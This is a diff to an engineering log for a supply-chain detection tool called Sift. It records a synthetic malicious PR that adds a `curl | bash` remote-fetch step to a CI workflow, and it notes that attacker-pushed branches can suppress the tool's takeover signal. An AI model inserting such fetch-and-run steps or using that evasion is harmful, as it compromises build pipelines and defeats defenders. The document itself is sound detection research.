@@ -609,13 +609,49 @@ Worth noting what this cost: everything upstream of it was already correct, and 
 single unset environment variable was enough to make the entire feature invisible
 while every test was green.
 
+### 9. First end-to-end production result
+
+endee mirror, PR #1: a synthetic identity (`testdev@launchxlabs.ai`) with one
+backdated commit predating its domain's current registration, opening a PR that
+adds `curl -fsSL <s3-url> | bash` to the beta Docker release workflow. Sift ran as
+the composite action under `pull_request_target`, with `domain_provenance: detail`.
+
+| | with the prior broken (run 1) | with the prior working (run 3) |
+|---|---|---|
+| provenance verdict | `unavailable` (CacheMiss) | `LIKELY` / `dormant` / `supporting` |
+| identity finding | `high`, "domain provenance is unavailable" | `high`, cites the 2023-03-11 vs 2024-03-08 discontinuity by date |
+| findings | 4 | 4 |
+| classification | suspicious | suspicious |
+
+The finding count did not move, which is the honest read: the `curl | bash` was
+independently damning and the case was already `suspicious` without provenance. What
+changed is the *content* of the identity finding -- from "we could not check" to a
+dated, specific ownership-discontinuity claim naming the takeover shape. That is the
+form in which this evidence is meant to be useful, and it matches the earlier
+synthetic A/B rather than exceeding it.
+
+Also observed, unrelated to provenance: run 3's verifier corrected a factual error
+run 1 had let through. Run 1 asserted the injected step ran "before secrets are
+loaded"; run 3 correctly noted that all secrets are available to every step via the
+`secrets` context regardless of step order.
+
+One defect this surfaced but did not fix: the standalone `sift-domain` action step
+keys on the PR author's *GitHub login* (`--event-path`), so it assessed the account
+that opened the PR (`eharris128`) rather than the commit author email, and reported
+"No candidate domains". The in-case evidence hook, which reads `commit_payload`, was
+correct throughout. The standalone rendering path needs the commit emails passed too.
+
 ### Remaining open questions
 
 1. **`gap_activity` scans `--all`, which includes attacker-pushable refs.**
    `_git_log_window` and `_commits_outside` pass `--all`, so the gap test counts
    commits on *any* ref in the repository rather than on the history under review.
-   Measured: a second local branch carrying backdated in-gap commits raised the
-   count from 1 to 4 and flipped the verdict to `continuous` counter-evidence.
+   **Confirmed in production**, not just locally. On the endee mirror, PR #1 with
+   an unrelated second branch (`sift-test-continuous`) present in the repo returned
+   `counter` / `NOTE` / `continuous`, 3 commits across the gap. Deleting that branch
+   and re-running the identical PR returned `supporting` / `LIKELY` / `dormant`,
+   0 commits. Same PR, same commits, same domain -- the only difference was a branch
+   the PR does not touch.
    Under `pull_request_target` the PR head is fetched into the analysis repo, so a
    contributor who can push a branch can manufacture the commits that suppress
    their own discontinuity signal. Counter-evidence sourced from attacker-writable
